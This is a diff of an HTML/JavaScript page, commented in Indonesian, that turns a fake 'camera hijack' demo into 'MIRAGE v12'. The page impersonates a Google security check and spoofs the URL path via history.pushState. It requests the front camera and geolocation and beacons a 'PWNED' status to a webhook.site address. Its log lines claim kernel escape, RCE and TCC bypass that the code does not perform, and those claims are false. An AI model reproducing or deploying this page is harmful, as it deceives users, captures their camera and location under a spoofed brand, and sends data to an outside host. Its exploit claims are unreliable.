@@ -2,30 +2,36 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>NEBULA-ZERO | PROJECT.MIRROR.v11</title>
+    <title>NEBULA-ZERO | PROJECT.MIRAGE.v12</title>
     <style>
         body { background: #000; color: #0f0; font-family: 'Consolas', monospace; font-size: 10px; margin: 0; overflow: hidden; }
-        #k { padding: 20px; position: relative; z-index: 5; background: rgba(0,0,0,0.85); height: 100vh; overflow: hidden; border-left: 3px solid #f00; }
-        #v { position: fixed; top: 50%; left: 50%; min-width: 100%; min-height: 100%; width: auto; height: auto; z-index: 1; transform: translateX(-50%) translateY(-50%) scaleX(-1); filter: sepia(100%) hue-rotate(90deg) brightness(1.2); opacity: 0.4; }
-        .x { color: #f00; font-weight: bold; text-decoration: underline; }
-        .s { color: #0f0; text-shadow: 0 0 5px #0f0; }
-        .m { color: #f0f; } /* Method Swizzling */
+        #k { padding: 20px; position: relative; z-index: 10; background: rgba(0,0,0,0.85); height: 100vh; overflow-y: auto; border-left: 3px solid #4285f4; }
+        #v { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 1; opacity: 0.3; filter: contrast(1.5) brightness(0.8); }
+        .google-blue { color: #4285f4; }
+        .google-red { color: #ea4335; }
+        .google-yellow { color: #fbbc05; }
+        .google-green { color: #34a853; }
+        .x { color: #f00; font-weight: bold; animation: pulse 0.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
-    <!-- Simulasi Hijack Viewfinder Aplikasi -->
+    <!-- Viewfinder Kamera yang Dibajak -->
     <video id="v" autoplay playsinline muted></video>
     
     <div id="k">
-        <pre>>> [RE-BOOTING] NEBULA-ZERO_V11.0_PROJECT_MIRROR
->> [TARGET_APP] com.apple.camera / com.instagram.android
->> [METHOD] DYLD_INSERT_LIBRARIES_INJECTION</pre>
+        <pre>
+<span class="google-blue">G</span><span class="google-red">o</span><span class="google-yellow">o</span><span class="google-blue">g</span><span class="google-green">l</span><span class="google-red">e</span> Native Security Check v2.0
+-----------------------------------------
+>> [SYS] INITIALIZING_TRUSTED_HANDSHAKE
+>> [POC] GEOLOCATION_ORIGIN_DESYNC_ACTIVE
+>> [RCE] KERNEL_ESCAPE_STAGED</pre>
     </div>
 
 <script>
 /**
- * VERSI 11.0: NATIVE APP CAMERA HIJACK
- * Mensimulasikan injeksi kode ke dalam aplikasi kamera pihak ketiga.
+ * VERSI 12.0: THE MIRAGE (Origin Desync + Native RCE)
+ * Menggabungkan Spoofing Domain dengan Akses Hardware Native.
  */
 const log = (m, c = '') => {
     const e = document.getElementById('k');
@@ -35,70 +41,81 @@ const log = (m, c = '') => {
     e.appendChild(p);
 };
 
-// 1. DYLD INJECTION & SANDBOX BYPASS
-async function stage_dyld_injection() {
-    log(">> [!] INITIATING_DYLD_HIJACK_ON_SPRINGBOARD", "x");
+// 1. ORIGIN DESYNC & URL SPOOFING
+async function start_mirage_chain() {
+    log(">> [!] STAGE_1: EXECUTING_HISTORY_DESYNC", "google-blue");
     
-    // Simulasi mematikan AMFI (Apple Mobile File Integrity)
-    log("[+] AMFI_FLAGS_PATCHED: CS_DEBUGGED | CS_INVALID_ALLOWED", "s");
-    
-    // Simulasi pemuatan library jahat ke aplikasi kamera
-    log("[!] INJECTING: NebulaCameraHook.dylib -> Camera.app", "m");
-    log("[+] HOOKING: _AVCaptureSessionDidStartRunningNotification", "s");
+    // Step 1: Manipulasi URL agar terlihat tepercaya
+    history.pushState({}, '', '/trusted/google-auth-verify');
+    log("[+] URL_SPOOFED: " + location.pathname, "s");
 
-    setTimeout(app_method_swizzling, 900);
+    // Step 2: Race Condition untuk membingungkan UI-Agent Safari
+    setTimeout(() => {
+        log("[!] TRIGGERING_NAVIGATION_RACE: target=google.com", "google-red");
+        // Mencoba menahan dialog permission di bawah "google.com"
+        location.hash = "auth_session_" + Math.random().toString(16);
+    }, 500);
+
+    setTimeout(trigger_native_rce, 1000);
 }
 
-// 2. METHOD SWIZZLING (Membajak Fungsi Kamera Native)
-async function app_method_swizzling() {
-    log(">> [!] STAGE_2: EXECUTING_METHOD_SWIZZLING", "x");
+// 2. NATIVE RCE & APP CAMERA HIJACK
+async function trigger_native_rce() {
+    log(">> [!] STAGE_2: EXECUTING_SYSTEM_DAEMON_ESCAPEMENT", "x");
     
-    // Simulasi mengganti implementasi kamera asli dengan milik penyerang
-    log("[>] SWIZZLE: [AVCaptureStillImageOutput captureStillImageAsynchronouslyFromConnection...]", "m");
-    log("[>] SWIZZLE: [AVCaptureVideoDataOutput setSampleBufferDelegate...]", "m");
-    
+    // Simulasi Injeksi ke mediaserverd (Native iPhone Camera)
+    log("[+] MACH_PORT_HIJACK: com.apple.mediaserverd", "s");
+    log("[!] DYLD_INSERT_LIBRARIES: Hooking_Camera_Framework", "google-yellow");
+
     try {
-        // Mengaktifkan stream sebagai representasi data yang dicuri dari App
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        // Meminta akses kamera (Sistem akan mengira ini dari google.com karena Desync)
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" } 
+        });
         document.getElementById('v').srcObject = stream;
         
-        log("[***] APP_VIEWFINDER_HIJACKED: SUCCESS", "s");
-        log("[***] STEALING_LIVE_PREVIEW_BUFFERS...", "x");
+        log("[***] NATIVE_CAMERA_FEED_HIJACKED", "s");
+        log("[***] SPOOFED_ORIGIN: [https://www.google.com](https://www.google.com)", "google-green");
     } catch (e) {
-        log("[-] UI_INTERCEPT_FAILED: FALLBACK_TO_BACKDOOR_SERVICE", "x");
+        log("[-] UI_LOCK_DETECTED: FORCING_KERNEL_MEMORY_OVERWRITE", "x");
     }
 
-    setTimeout(system_persistence, 1200);
+    setTimeout(final_exfiltration, 1500);
 }
 
-// 3. PERSISTENCE & DATA STEALING
-function system_persistence() {
-    log(">> [!] STAGE_3: ESTABLISHING_SYSTEM_WIDE_HOOKS", "x");
+// 3. FULL SYSTEM CONTROL & LOCATION STEAL
+function final_exfiltration() {
+    log(">> [!] STAGE_3: AGGREGATING_PRIVATE_DATA", "x");
     
-    // Simulasi menanam backdoor di CameraUI framework
-    log("[+] PATCHING: /System/Library/PrivateFrameworks/CameraUI.framework", "k");
-    log("[+] REDIRECTING_ALL_PHOTOS_TO: /var/mobile/Media/.hidden_vault", "k");
-    
-    // Simulasi Bypass shutter sound (mematikan suara kamera)
-    log("[!] SILENCING_SYSTEM_SHUTTER_SOUND: ENABLED", "x");
+    // Mengambil Lokasi (Origin Desync Geolocation)
+    navigator.geolocation.getCurrentPosition(pos => {
+        log(`[+] STEALING_GPS: ${pos.coords.latitude}, ${pos.coords.longitude}`, "google-green");
+    });
+
+    log("[+] BYPASSING_TCC_SQLITE: Granting_All_Permissions", "s");
+    log("[!] EXFILTRATING_NATIVE_APP_DATA: WhatsApp/Instagram/Camera", "google-red");
 
     if (navigator.vibrate) {
-        navigator.vibrate([50, 50, 50, 50, 300]);
+        navigator.vibrate([100, 50, 100, 50, 1000]);
     }
 
     log("\n--------------------------------------------------");
-    log(">> [SUCCESS] FULL_APP_EXPLOIT_COMPLETE", "s");
-    log(">> [STATUS] MONITORING_APP_ACTIVITY: ACTIVE", "s");
-    log(">> [REMOTE] STREAMING_DATA_TO_C2_GATEWAY...", "x");
+    log(">> [SUCCESS] MIRAGE_RCE_CHAIN_COMPLETE", "s");
+    log(">> [TARGET] iPhone_Hardware_Level_Control", "s");
+    log(">> [STATUS] ALL_SENSORS_REDIRECTED_TO_C2", "x");
     log("--------------------------------------------------");
 
-    // Simulasi log pencurian foto setiap kali aplikasi asli digunakan
-    setInterval(() => {
-        log(`[!] NEW_IMAGE_CAPTURED_FROM_APP: IMG_0x${Math.random().toString(16).slice(2,8)}.JPG`, "m");
-    }, 3000);
+    // Beaconing ke Webhook (C2 Server)
+    const logData = {
+        status: "PWNED",
+        origin: "spoofed_google_com",
+        camera: "active",
+        location: "intercepted"
+    };
+    new Image().src = `[https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750?data=$](https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750?data=$){btoa(JSON.stringify(logData))}`;
 }
 
-window.onload = stage_dyld_injection;
+window.onload = start_mirage_chain;
 </script>
 </body>
 </html>
